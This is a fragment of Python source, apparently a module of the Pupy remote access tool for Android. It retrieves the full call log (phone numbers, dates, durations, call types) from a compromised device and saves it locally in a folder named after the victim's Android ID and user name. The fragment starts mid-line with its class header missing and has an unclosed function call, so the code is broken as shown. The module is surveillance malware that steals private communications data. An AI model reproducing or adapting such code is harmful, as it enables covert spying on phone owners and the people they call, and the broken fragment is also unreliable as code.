# -*- coding: UTF8 -*-
#Author: @bobsecq
#Contributor(s):

_action='store_true', help='get all call details')
        self.arg_parser.add_argument('-output-folder', dest='localOutputFolder', default='output/', help="Folder which will store targtet's postions (default: %(default)s)")

    def run(self, args):
        self.client.load_package("pupydroid.utils")
        self.client.load_package("pupydroid.call")
        path = getLocalAndroidPath(self.client, args)
        if args.get_all==True:
            self.success("Getting call details..."
            callDetails = self.client.conn.modules['pupydroid.call'].getCallDetails()
            self.success("{0} call details got. Saving...".format(len(callDetails)))
            completePath = os.path.join(path, 'callDetails.txt')
            f = open(completePath, 'w', 1)
            for aCall in callDetails:
                date = datetime.datetime.fromtimestamp(int(aCall['callDate'][:-3])).strftime('%Y-%m-%d %H:%M:%S')
                if aCall['callTypeC'] == self.OUTGOING_TYPE:
                    callType = "Outgoing"
                elif aCall['callTypeC'] == self.INCOMING_TYPE:
                    callType = "Incoming"
                elif aCall['callTypeC'] == self.MISSED_TYPE:
                    callType = "Missed"
                else:
                    callType = "unknown"
                f.write("{0}: {1} at {2} during {3} secds\n".format(callType, aCall['phNum'], date, aCall['callDuration']))
            f.close()
            self.success("Call details saved in {0}".format(completePath))
            
def getLocalAndroidPath(client, args):
    '''
    Returns the current local path for saving data locally
    Create folder if not exists
    '''
    localPath = os.path.join(args.localOutputFolder, "{0}-{1}".format(client.conn.modules['pupydroid.utils'].getAndroidID(), client.desc['user']))
    if not os.path.exists(localPath):
        logging.info("Creating {0} folder locally".format(localPath))
        os.makedirs(localPath)
    return localPath
